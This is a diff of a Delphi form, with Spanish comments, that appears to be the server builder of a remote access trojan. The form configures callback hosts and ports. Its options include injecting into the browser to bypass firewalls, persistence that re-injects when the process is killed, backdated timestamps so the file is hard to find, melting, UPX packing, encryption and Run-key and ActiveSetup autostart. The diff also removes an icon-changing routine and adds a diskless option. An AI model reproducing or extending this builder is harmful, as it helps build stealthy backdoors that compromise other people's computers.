@@ -6,72 +6,79 @@ uses
   Windows, SysUtils, Classes, Graphics, Controls, Forms,
   Dialogs, StdCtrls, Buttons,
   SettingsDef, {Esta es la unidad para leer la configuracion}
-  MadRes, {Unidad para cambiar el icono de un EXE}
-
   ExtCtrls, ComCtrls,
-  gnugettext;
+  gnugettext, ImgList;
 
 type
   TFormConfigServer = class(TForm)
-    GroupBox2: TGroupBox;
-    Label2: TLabel;
-    EditIP: TEdit;
-    Label3: TLabel;
-    EditPuerto: TEdit;
-    Label1: TLabel;
-    EditID: TEdit;
-    GroupBox3: TGroupBox;
+    StatusBar: TStatusBar;
+    OpenDialog: TOpenDialog;
+    PageControl: TPageControl;
+    TabConexion: TTabSheet;
+    TabInstalacion: TTabSheet;
+    TabOpciones: TTabSheet;
+    TabCrear: TTabSheet;
+    MemoOutput: TMemo;
+    lbl2: TLabel;
+    listviewconexionesconfig: TListView;
+    btn3: TSpeedButton;
+    btn2: TSpeedButton;
+    btn1: TSpeedButton;
+    btn4: TSpeedButton;
     CheckBoxCopiar: TCheckBox;
-    EditCopyTo: TEdit;
-    Label8: TLabel;
+    Label6: TLabel;
     EditFileName: TEdit;
     CheckBoxMelt: TCheckBox;
     CheckBoxCopiarConFechaAnterior: TCheckBox;
     CheckBoxRun: TCheckBox;
-    Label15: TLabel;
+    CheckBoxActiveSetup: TCheckBox;
+    CheckBoxUPX: TCheckBox;
+    CheckBoxCifrar: TCheckBox;
+    btnBtnGuardarConfig: TSpeedButton;
+    btnBtnSalir: TSpeedButton;
+    CheckBoxInyectar: TCheckBox;
+    CheckBoxPersistencia: TCheckBox;
+    CheckBoxEscribirADisco: TCheckBox;
+    EditCopyTo: TEdit;
     EditRunName: TEdit;
-    MemoOutput: TMemo;
-    StatusBar: TStatusBar;
-    Bevel1: TBevel;
-    Label6: TLabel;
-    GroupBox1: TGroupBox;
-    BtnGuardarConfig: TSpeedButton;
-    BtnSalir: TSpeedButton;
-    Bevel4: TBevel;
-    ImageIcon: TImage;
+    EditActiveSetup: TEdit;
+    EditPluginName: TEdit;
+    EditID: TEdit;
+    EditIP: TEdit;
+    EditPuerto: TEdit;
     Label4: TLabel;
-    ListViewConexionesConfig: TListView;
+    Label15: TLabel;
+    Label7: TLabel;
+    Label1: TLabel;
+    Label3: TLabel;
+    SpeedButtonSiguiente: TSpeedButton;
+    SpeedButtonAnterior: TSpeedButton;
     SpeedButton1: TSpeedButton;
     SpeedButton2: TSpeedButton;
     SpeedButton3: TSpeedButton;
-    SpeedButton4: TSpeedButton;
-    OpenDialog: TOpenDialog;
-    CheckBoxInyectar: TCheckBox;
-    CheckboxUPX: TCheckBox;
-    CheckBoxPersistencia: TCheckBox;
-    Label5: TLabel;
-    EditPluginName: TEdit;
-    CheckBoxActiveSetup: TCheckBox;
-    Label7: TLabel;
-    EditActiveSetup: TEdit;
-    CheckBoxCifrar: TCheckBox;
+    SpeedButton5: TSpeedButton;
+    ImageList: TImageList;
     procedure FormShow(Sender: TObject);
-    procedure ImageIconClick(Sender: TObject);
-    procedure BtnGuardarConfigClick(Sender: TObject);
-    procedure BtnSalirClick(Sender: TObject);
+    procedure btnBtnGuardarConfigClick(Sender: TObject);
+    procedure btnBtnSalirClick(Sender: TObject);
     procedure EditPuertoKeyPress(Sender: TObject; var Key: char);
     procedure EditIPKeyPress(Sender: TObject; var Key: char);
     procedure CheckBoxCopiarClick(Sender: TObject);
     procedure CheckBoxRunClick(Sender: TObject);
-    procedure FormCreate(Sender: TObject);
-    procedure SpeedButton1Click(Sender: TObject);
-    procedure SpeedButton4Click(Sender: TObject);
-    procedure SpeedButton2Click(Sender: TObject);
-    procedure SpeedButton3Click(Sender: TObject);
+    procedure btn1Click(Sender: TObject);
+    procedure btn4Click(Sender: TObject);
+    procedure btn2Click(Sender: TObject);
+    procedure btn3Click(Sender: TObject);
     procedure CheckBoxInyectarClick(Sender: TObject);
     procedure EditActiveSetupClick(Sender: TObject);
     procedure CheckBoxActiveSetupClick(Sender: TObject);
     procedure FormClose(Sender: TObject; var Action: TCloseAction);
+    procedure SpeedButtonSiguienteClick(Sender: TObject);
+    procedure SpeedButtonAnteriorClick(Sender: TObject);
+    procedure SpeedButton1Click(Sender: TObject);
+    procedure SpeedButton2Click(Sender: TObject);
+    procedure SpeedButton3Click(Sender: TObject);
+    procedure SpeedButton5Click(Sender: TObject);
   private
     { Private declarations }
     IconPath: string;
@@ -86,30 +93,18 @@ var
 
 implementation
 
-{$R *.dfm}
+uses UnitOpciones;
 
-function UpdateExeIcon(exeFile, iconGroup, icoFile: string): Boolean;
-//Copy-Pasted from Madshi's forums by Wack-a-Mole. [October/25/2006]
-var
-  resUpdateHandle: dword;
-begin
-  resUpdateHandle := BeginUpdateResourceW(PWideChar(WideString(exeFile)), False);
-  if resUpdateHandle <> 0 then
-    begin
-      Result := LoadIconGroupResourceW(resUpdateHandle, PWideChar(WideString(iconGroup)),
-        0, PWideChar(WideString(icoFile)));
-      Result := EndUpdateResourceW(resUpdateHandle, False) and Result;
-    end
-  else
-    Result := False;
-end;
+{$R *.dfm}
 
 procedure TFormConfigServer.FormShow(Sender: TObject);
 var
   tmpstr, tmpstr2: string;
   item: Tlistitem;
 begin
-  StatusBar.Panels[0].Text := _('Seleccione el servidor que desea modificar.');
+  FormConfigServer.ShowHint := Formopciones.CheckboxAyuda3.Checked;
+  PageControl.ActivePageIndex := 0;
+  //StatusBar.Panels[0].Text := _('Seleccione el servidor que desea modificar.');
   IconPath := '';
   MemoOutput.Clear;
   MemoOutput.Lines.Append(_('> Listo.'));
@@ -152,20 +147,22 @@ begin
      exit;
    end;         }
    //comprobamos que sea correcto el nombre para copiar
-  if EditPluginName.Text = '' then
+  if (EditPluginName.Text = '') and (CheckBoxEscribirADisco.Checked) then
     begin
       MessageBeep($FFFFFFFF);
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
       EditPluginName.SetFocus;
+      PageControl.ActivePage := TabOpciones;
       Result := False;
       StatusBar.Panels[0].Text :=
         _('Tienes que establecer un nombre al plugin');
 
       Exit;
     end;
-
-  s := EditPluginName.Text;
-  if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
+  if(CheckBoxEscribirADisco.Checked) then
+  begin
+    s := EditPluginName.Text;
+    if (Pos('|', S) <> 0) or (Pos('*', S) <> 0) or (Pos('/', S) <> 0) or
     (Pos(':', S) <> 0) or (Pos('?', S) <> 0) or (Pos('"', S) <> 0) or
     (Pos('<', S) <> 0) or (Pos('>', S) <> 0) then
     begin
@@ -177,6 +174,7 @@ begin
       Result := False;
       Exit;
     end;
+  end;
 
   if EditCopyTo.Text[Length(EditCopyTo.Text)] <> '\' then
     EditCopyTo.Text := EditCopyTo.Text + '\';
@@ -190,30 +188,12 @@ begin
       MessageBeep($FFFFFFFF);
       //Suena un ruidito..., para informar que hay que mirar la StatusBar :)
       EditCopyTo.SetFocus;
+      Pagecontrol.ActivePage := TabInstalacion;
       Result := False;
       Exit;
     end;
 end;
 
-procedure TFormConfigServer.ImageIconClick(Sender: TObject);
-begin
-  with OpenDialog do
-    begin
-      Title := _('Abrir icono...');
-      Options := [ofFileMustExist]; //solo deja seleccionar archivos que existan
-      Filter := _('Icono') + ' (*.ico)|*.ico';
-      DefaultExt := 'ico';
-      InitialDir := GetCurrentDir();
-      if Execute then
-        begin
-          if FileName <> '' then
-            begin
-              IconPath := FileName;
-              ImageIcon.Picture.LoadFromFile(IconPath);
-            end;
-        end;
-    end;
-end;
 
 function leerarchivo(f: string): string;
 var
@@ -253,7 +233,7 @@ begin
     borrararchivo(extractfiledir(ParamStr(0)) + '\' + _('Servidor.exe'));
 end;
 
-procedure TFormConfigServer.BtnGuardarConfigClick(Sender: TObject);
+procedure TFormConfigServer.btnBtnGuardarConfigClick(Sender: TObject);
 var
   ConfigToSave: PSettings;
   Servidor: string;
@@ -350,7 +330,10 @@ begin
         if (ListViewConexionesConfig.Items[i] <> nil) then //creamos la lista de hosts
           ConfigToSave.sHosts := ConfigToSave.sHosts + ListViewConexionesConfig.Items[i].Caption + ':' + ListViewConexionesConfig.Items[i].SubItems[0] + '¬';
       ConfigToSave.sID := EditID.Text;
-      ConfigToSave.sPluginName := EditPluginName.Text;
+      if(CheckBoxEscribirADisco.Checked) then
+        ConfigToSave.sPluginName := EditPluginName.Text
+      else
+        ConfigToSave.sPluginName := 'NOESCRIBIRADISCO';
       ConfigToSave.bCopiarArchivo := CheckBoxCopiar.Checked;
       ConfigToSave.sFileNameToCopy := EditFileName.Text;
       ConfigToSave.sCopyTo := EditCopyTo.Text;
@@ -380,15 +363,11 @@ begin
       if IconPath <> '' then //cambiar icono
         begin
           MemoOutput.Lines.Append(_('> Cambiando el icono al servidor...'));
-          if UpdateExeIcon(Servidor, 'MAINICON', IconPath) = True then
-            MemoOutput.Lines.Append(_('> El ícono se cambió con éxito.'))
-          else
-            MemoOutput.Lines.Append('> No se pudo cambiar el ícono.');
         end;
     end;
 end;
 
-procedure TFormConfigServer.BtnSalirClick(Sender: TObject);
+procedure TFormConfigServer.btnBtnSalirClick(Sender: TObject);
 begin
   Close;
 end;
@@ -424,7 +403,7 @@ begin
   EditCopyTo.Enabled := CheckBoxCopiar.Checked;
   CheckBoxMelt.Enabled := CheckBoxCopiar.Checked;
   CheckBoxCopiarConFechaAnterior.Enabled := CheckBoxCopiar.Checked;
-  Label8.Enabled := CheckBoxCopiar.Checked; //nombre de archivo
+  Label4.Enabled := CheckBoxCopiar.Checked; //nombre de archivo
   Label6.Enabled := CheckBoxCopiar.Checked;
 end;
 
@@ -434,39 +413,9 @@ begin
   Label15.Enabled := CheckBoxRun.Checked; //nombre de clave
 end;
 
-procedure TFormConfigServer.FormCreate(Sender: TObject);
-var
-  s: string;
-begin
-  //Hints para la ruta
-  s := _('Se pueden poner variables en la ruta que serán reemplazadas cuando se ejecute el servidor.')
-    +
-    #13#10 + _('Las variables aceptadas son:') + #13#10#13#10 +
-    _('%WinDir% -> Se reemplaza por el directorio de Windows (Por ejemplo C:\Windows\)') +
-    #13#10 + _('%SysDir% -> Se reemplaza por el directorio de sistema (Por ejemplo C:\System32\)')
-    +
-    #13#10 + _('%TempDir% -> Se reemplaza por el directorio de archivos temporales (Por ejemplo C:\Temp\)') +
-    #13#10 + _('%AppDir% -> Se reemplaza por el directorio de datos de aplicaciones (Por ejemplo C:\Documents and Settings\user\appdata\) (Recomendado)') +
-    #13#10 + _('%RootDir% -> Se reemplaza por la ruta principal del directorio de Windows (Por ejemplo C:\)');
-  EditCopyTo.Hint := s;
 
-  s := _('Cuando el servidor sea copiado a la carpeta de destino, su fecha de') + #13#10 +
-    _('modificación cambiará por una anterior de modo que no pueda encotrarse') + #13#10 +
-    _('de modo que no pueda encontrarse facilmente al listar archivos por fecha') + #13#10 +
-    _('de modificación.');
-  CheckBoxCopiarConFechaAnterior.Hint := s;
 
-  s := _('Cuando el proceso servidor sea matado volvera a iniciarse e inyectarse') {+ #13#10 +
-  'Si es matado más de tres veces se inyectara en explorer.exe para no ser tan visible' + #13#10+
-  'Si el archivo donde se instala es borrado volverá a copiarse en otro directorio con un nombre aleatorio'};
-  CheckBoxPersistencia.Hint := s;
-
-  s := _('El servidor se inyectará en el navegador predeterminado para saltarse firewalls') + #13#10 +
-    _('Atención: Activar esta opción incrementa el tamaño del servidor');
-  CheckBoxInyectar.Hint := s;
-end;
-
-procedure TFormConfigServer.SpeedButton1Click(Sender: TObject);
+procedure TFormConfigServer.btn1Click(Sender: TObject);
 var
   item: Tlistitem;
   s: string;
@@ -497,13 +446,13 @@ begin
   EditPuerto.Text := '';
 end;
 
-procedure TFormConfigServer.SpeedButton4Click(Sender: TObject);
+procedure TFormConfigServer.btn4Click(Sender: TObject);
 begin
   if listviewconexionesconfig.Selected <> nil then
     listviewconexionesconfig.Selected.Delete;
 end;
 
-procedure TFormConfigServer.SpeedButton2Click(Sender: TObject);
+procedure TFormConfigServer.btn2Click(Sender: TObject);
 var
   i: Integer;
   value1, value2: string;
@@ -525,7 +474,7 @@ begin
     end;
 end;
 
-procedure TFormConfigServer.SpeedButton3Click(Sender: TObject);
+procedure TFormConfigServer.btn3Click(Sender: TObject);
 var
   i: Integer;
   value1, value2: string;
@@ -612,4 +561,34 @@ begin
         ipsypuertos := ipsypuertos + ListViewConexionesConfig.Items[i].Caption + ':' + ListViewConexionesConfig.Items[i].SubItems[0] + '¬';
     end;
 end;
+procedure TFormConfigServer.SpeedButtonSiguienteClick(Sender: TObject);
+begin
+  PageControl.ActivePageIndex := 1;
+end;
+
+procedure TFormConfigServer.SpeedButtonAnteriorClick(Sender: TObject);
+begin
+  PageControl.ActivePageIndex := 0;
+end;
+
+procedure TFormConfigServer.SpeedButton1Click(Sender: TObject);
+begin
+  PageControl.ActivePageIndex := 2;
+end;
+
+procedure TFormConfigServer.SpeedButton2Click(Sender: TObject);
+begin
+  PageControl.ActivePageIndex := 1;
+end;
+
+procedure TFormConfigServer.SpeedButton3Click(Sender: TObject);
+begin
+  PageControl.ActivePageIndex := 3;
+end;
+
+procedure TFormConfigServer.SpeedButton5Click(Sender: TObject);
+begin
+  PageControl.ActivePageIndex := 2;
+end;
+
 end.
